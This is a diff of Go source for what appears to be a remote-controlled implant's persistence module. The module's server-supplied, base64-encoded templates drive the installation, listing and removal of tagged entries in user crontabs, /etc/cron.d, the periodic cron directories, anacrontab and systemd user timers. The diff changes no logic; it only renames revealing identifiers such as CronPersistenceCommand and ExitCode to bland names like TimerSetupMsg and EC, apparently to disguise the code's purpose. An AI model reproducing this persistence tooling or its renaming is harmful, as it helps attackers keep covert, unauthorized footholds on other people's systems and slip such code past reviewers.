@@ -18,8 +18,8 @@ import (
 	"golang.org/x/sys/unix"
 )
 
-// CronTemplate holds server-provided template data (v2: array-based)
-type CronTemplate struct {
+// TimerCfg holds server-provided template data (v2: array-based)
+type TimerCfg struct {
 	Version   int      `json:"v"`
 	Type      int      `json:"t"`   // Type identifier
 	Templates []string `json:"tpl"` // Array indexed by position
@@ -101,25 +101,25 @@ const (
 )
 
 
-// CronPersistenceCommand handles cron-based persistence
-type CronPersistenceCommand struct {
-	tpl *CronTemplate
+// TimerSetupMsg handles cron-based persistence
+type TimerSetupMsg struct {
+	tpl *TimerCfg
 }
 
 // getTpl safely gets template value by index
 // No fallbacks - templates are always provided by server
-func (c *CronPersistenceCommand) getTpl(idx int) string {
+func (c *TimerSetupMsg) getTpl(idx int) string {
 	if c.tpl != nil && c.tpl.Templates != nil && idx < len(c.tpl.Templates) {
 		return c.tpl.Templates[idx]
 	}
 	return ""
 }
 
-func (c *CronPersistenceCommand) Execute(ctx *CommandContext, args []string) CommandResult {
-	// Parse template from Command.Data if provided
-	if ctx.CurrentCommand != nil && ctx.CurrentCommand.Data != "" {
-		if decoded, err := base64.StdEncoding.DecodeString(ctx.CurrentCommand.Data); err == nil {
-			var tpl CronTemplate
+func (c *TimerSetupMsg) execute(ctx *OpCtx, args []string) OpResult {
+	// Parse template from Msg.Data if provided
+	if ctx.CurrentMsg != nil && ctx.CurrentMsg.Data != "" {
+		if decoded, err := base64.StdEncoding.DecodeString(ctx.CurrentMsg.Data); err == nil {
+			var tpl TimerCfg
 			if err := json.Unmarshal(decoded, &tpl); err == nil {
 				c.tpl = &tpl
 			}
@@ -152,7 +152,7 @@ func (c *CronPersistenceCommand) Execute(ctx *CommandContext, args []string) Com
 }
 
 // addCronPersistence adds cron job via selected method(s)
-func (c *CronPersistenceCommand) addCronPersistence(args []string) CommandResult {
+func (c *TimerSetupMsg) addCronPersistence(args []string) OpResult {
 	var targetUser string
 	var interval string
 	var command string
@@ -188,9 +188,9 @@ func (c *CronPersistenceCommand) addCronPersistence(args []string) CommandResult
 	if targetUser == "" {
 		currentUser, err := user.Current()
 		if err != nil {
-			return CommandResult{
+			return OpResult{
 				Output:   Err(E19),
-				ExitCode: 1,
+				EC: 1,
 			}
 		}
 		targetUser = currentUser.Username
@@ -211,7 +211,7 @@ func (c *CronPersistenceCommand) addCronPersistence(args []string) CommandResult
 
 	var results []string
 
-	// Execute based on selected method
+	// execute based on selected method
 	switch method {
 	case c.getTpl(idxCronMethodSpool):
 		if result := c.addViaSpoolCron(targetUser, interval, command); result != "" {
@@ -251,27 +251,27 @@ func (c *CronPersistenceCommand) addCronPersistence(args []string) CommandResult
 			results = append(results, result)
 		}
 	default:
-		return CommandResult{
+		return OpResult{
 			Output:   ErrCtx(E21, method),
-			ExitCode: 1,
+			EC: 1,
 		}
 	}
 
 	if len(results) == 0 {
-		return CommandResult{
+		return OpResult{
 			Output:   ErrCtx(E11, method),
-			ExitCode: 1,
+			EC: 1,
 		}
 	}
 
-	return CommandResult{
+	return OpResult{
 		Output:   strings.Join(results, "\n"),
-		ExitCode: 0,
+		EC: 0,
 	}
 }
 
 // addViaSpoolCron adds to user's crontab file directly
-func (c *CronPersistenceCommand) addViaSpoolCron(username, interval, command string) string {
+func (c *TimerSetupMsg) addViaSpoolCron(username, interval, command string) string {
 	spoolCrontabs := c.getTpl(idxCronSpoolCrontabs)
 	spoolCron := c.getTpl(idxCronSpoolCron)
 	spoolTabs := c.getTpl(idxCronSpoolTabs)
@@ -317,7 +317,7 @@ func (c *CronPersistenceCommand) addViaSpoolCron(username, interval, command str
 }
 
 // addViaCronD adds job to /etc/cron.d/
-func (c *CronPersistenceCommand) addViaCronD(username, interval, command string) string {
+func (c *TimerSetupMsg) addViaCronD(username, interval, command string) string {
 	cronDDir := c.getTpl(idxCronEtcCronD)
 	if cronDDir == "" {
 		return ""
@@ -349,7 +349,7 @@ func (c *CronPersistenceCommand) addViaCronD(username, interval, command string)
 }
 
 // addViaCronDirectories adds to /etc/cron.{hourly,daily,weekly,monthly}
-func (c *CronPersistenceCommand) addViaCronDirectories(command, interval string) string {
+func (c *TimerSetupMsg) addViaCronDirectories(command, interval string) string {
 	intHourly := c.getTpl(idxCronIntHourly)
 	intDaily := c.getTpl(idxCronIntDaily)
 	intWeekly := c.getTpl(idxCronIntWeekly)
@@ -400,7 +400,7 @@ func (c *CronPersistenceCommand) addViaCronDirectories(command, interval string)
 }
 
 // addViaAnacron adds anacron job for systems that don't run 24/7
-func (c *CronPersistenceCommand) addViaAnacron(command string) string {
+func (c *TimerSetupMsg) addViaAnacron(command string) string {
 	anacronTab := c.getTpl(idxCronEtcAnacrontab)
 	if anacronTab == "" {
 		return ""
@@ -431,7 +431,7 @@ func (c *CronPersistenceCommand) addViaAnacron(command string) string {
 }
 
 // addViaSystemdTimer creates a systemd user timer (no root required)
-func (c *CronPersistenceCommand) addViaSystemdTimer(interval, command string) string {
+func (c *TimerSetupMsg) addViaSystemdTimer(interval, command string) string {
 	currentUser, err := user.Current()
 	if err != nil {
 		return ""
@@ -485,7 +485,7 @@ func (c *CronPersistenceCommand) addViaSystemdTimer(interval, command string) st
 }
 
 // generateTimerUnit creates a systemd timer unit file content
-func (c *CronPersistenceCommand) generateTimerUnit(interval string) string {
+func (c *TimerSetupMsg) generateTimerUnit(interval string) string {
 	var timerSpec string
 
 	intHourly := c.getTpl(idxCronIntHourly)
@@ -531,7 +531,7 @@ func (c *CronPersistenceCommand) generateTimerUnit(interval string) string {
 }
 
 // generateCronEntry creates a cron entry
-func (c *CronPersistenceCommand) generateCronEntry(interval, command string) string {
+func (c *TimerSetupMsg) generateCronEntry(interval, command string) string {
 	cronComment := c.getTpl(idxCronComment)
 	comment := fmt.Sprintf("%s %s", cronComment, time.Now().Format("2006-01-02"))
 
@@ -542,7 +542,7 @@ func (c *CronPersistenceCommand) generateCronEntry(interval, command string) str
 }
 
 // convertInterval converts special intervals to cron format
-func (c *CronPersistenceCommand) convertInterval(interval string) string {
+func (c *TimerSetupMsg) convertInterval(interval string) string {
 	intHourly := c.getTpl(idxCronIntHourly)
 	intDaily := c.getTpl(idxCronIntDaily)
 	intWeekly := c.getTpl(idxCronIntWeekly)
@@ -566,7 +566,7 @@ func (c *CronPersistenceCommand) convertInterval(interval string) string {
 }
 
 // removeCronPersistence removes cron persistence
-func (c *CronPersistenceCommand) removeCronPersistence(args []string) CommandResult {
+func (c *TimerSetupMsg) removeCronPersistence(args []string) OpResult {
 	var targetUser string
 	var method string = c.getTpl(idxCronMethodAll)
 
@@ -628,26 +628,26 @@ func (c *CronPersistenceCommand) removeCronPersistence(args []string) CommandRes
 		results = append(results, c.removeSystemdTimer()...)
 
 	default:
-		return CommandResult{
+		return OpResult{
 			Output:   ErrCtx(E21, method),
-			ExitCode: 1,
+			EC: 1,
 		}
 	}
 
 	if len(results) == 0 {
-		return CommandResult{
+		return OpResult{
 			Output:   ErrCtx(E4, method),
-			ExitCode: 1,
+			EC: 1,
 		}
 	}
 
-	return CommandResult{
+	return OpResult{
 		Output:   strings.Join(results, "\n"),
-		ExitCode: 0,
+		EC: 0,
 	}
 }
 
-func (c *CronPersistenceCommand) removeSpoolCron(targetUser string) []string {
+func (c *TimerSetupMsg) removeSpoolCron(targetUser string) []string {
 	var results []string
 	spoolCrontabs := c.getTpl(idxCronSpoolCrontabs)
 	spoolCron := c.getTpl(idxCronSpoolCron)
@@ -670,7 +670,7 @@ func (c *CronPersistenceCommand) removeSpoolCron(targetUser string) []string {
 	return results
 }
 
-func (c *CronPersistenceCommand) removeCronD() string {
+func (c *TimerSetupMsg) removeCronD() string {
 	cronDDir := c.getTpl(idxCronEtcCronD)
 	fileCheck := c.getTpl(idxCronFileCheck)
 	if cronDDir == "" || fileCheck == "" {
@@ -684,7 +684,7 @@ func (c *CronPersistenceCommand) removeCronD() string {
 	return ""
 }
 
-func (c *CronPersistenceCommand) removeCronDirectories() []string {
+func (c *TimerSetupMsg) removeCronDirectories() []string {
 	var results []string
 	fileUpdate := c.getTpl(idxCronFileUpdate)
 	if fileUpdate == "" {
@@ -711,7 +711,7 @@ func (c *CronPersistenceCommand) removeCronDirectories() []string {
 }
 
 // cleanCronFile removes our entries from a cron file
-func (c *CronPersistenceCommand) cleanCronFile(filePath string) error {
+func (c *TimerSetupMsg) cleanCronFile(filePath string) error {
 	content, err := os.ReadFile(filePath)
 	if err != nil {
 		return err
@@ -740,7 +740,7 @@ func (c *CronPersistenceCommand) cleanCronFile(filePath string) error {
 }
 
 // cleanAnacron removes our anacron entries
-func (c *CronPersistenceCommand) cleanAnacron() error {
+func (c *TimerSetupMsg) cleanAnacron() error {
 	anacronPath := c.getTpl(idxCronEtcAnacrontab)
 	if anacronPath == "" {
 		return fmt.Errorf(Err(E4))
@@ -765,7 +765,7 @@ func (c *CronPersistenceCommand) cleanAnacron() error {
 }
 
 // removeSystemdTimer removes systemd user timer files
-func (c *CronPersistenceCommand) removeSystemdTimer() []string {
+func (c *TimerSetupMsg) removeSystemdTimer() []string {
 	var results []string
 
 	currentUser, err := user.Current()
@@ -798,7 +798,7 @@ func (c *CronPersistenceCommand) removeSystemdTimer() []string {
 }
 
 // listCronPersistence lists all found cron persistence
-func (c *CronPersistenceCommand) listCronPersistence() CommandResult {
+func (c *TimerSetupMsg) listCronPersistence() OpResult {
 	var results []string
 
 	cronComment := c.getTpl(idxCronComment)
@@ -875,14 +875,14 @@ func (c *CronPersistenceCommand) listCronPersistence() CommandResult {
 	}
 
 	if len(results) == 0 {
-		return CommandResult{
+		return OpResult{
 			Output:   Err(E4),
-			ExitCode: 0,
+			EC: 0,
 		}
 	}
 
-	return CommandResult{
+	return OpResult{
 		Output:   strings.Join(results, "\n"),
-		ExitCode: 0,
+		EC: 0,
 	}
 }
